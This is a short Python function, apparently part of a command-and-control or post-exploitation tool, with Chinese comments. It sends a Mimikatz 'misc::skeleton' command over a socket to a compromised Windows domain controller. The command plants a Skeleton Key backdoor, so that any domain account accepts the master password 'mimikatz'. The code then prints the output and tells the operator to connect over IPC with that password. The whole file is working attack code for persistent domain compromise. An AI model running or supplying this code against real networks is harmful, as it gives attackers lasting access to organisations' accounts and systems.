import struct


# 使用Skeleton Key(万能密码)，可以对域内权限进行持久化操作
# 如下命令需要在域控下执行
def Skeleton_Key(conn):
    command = "mimikatz.exe \"privilege::debug\" \"misc::skeleton\" exit"
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
    print('\033[1;32;32m' + "[+] You can now try connecting to the domain control host through the IPC protocol using the password \"mimikatz\"" + '\033[0m')
